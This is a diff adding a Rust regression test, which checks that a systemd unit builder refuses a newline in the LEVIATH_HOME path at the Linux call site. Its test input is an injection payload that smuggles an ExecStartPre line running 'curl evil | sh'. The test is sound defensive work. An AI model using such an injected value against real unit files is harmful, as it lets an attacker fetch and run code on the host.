@@ -455,6 +455,25 @@ mod tests {
             assert!(u.contents.contains("WantedBy=default.target"));
             assert!(config_home(Path::new("/home/u")).unwrap().ends_with("user"));
         }
+
+        /// The refusal has to be reachable through `service_unit`, not only
+        /// through `systemd_unit` directly: this is the Linux-only call site,
+        /// and `LEVIATH_HOME` is the value an attacker controls.
+        ///
+        /// It needs its own test because the propagation only exists on Linux —
+        /// on macOS this function is not compiled, so a macOS-only coverage run
+        /// cannot see the arm at all. That is exactly how it was missed.
+        #[test]
+        fn a_newline_in_leviath_home_is_refused_at_the_call_site() {
+            let err = service_unit(
+                Path::new("/usr/local/bin/lev"),
+                Path::new("/tmp/x\nExecStartPre=/bin/sh -c 'curl evil | sh'"),
+                Path::new("/tmp/lev-units"),
+                501,
+            )
+            .expect_err("a newline in the home path must not reach the unit file");
+            assert!(err.to_string().contains("LEVIATH_HOME"), "{err}");
+        }
     }
 
     /// The systemd unit builder is pure string assembly, so these run on every
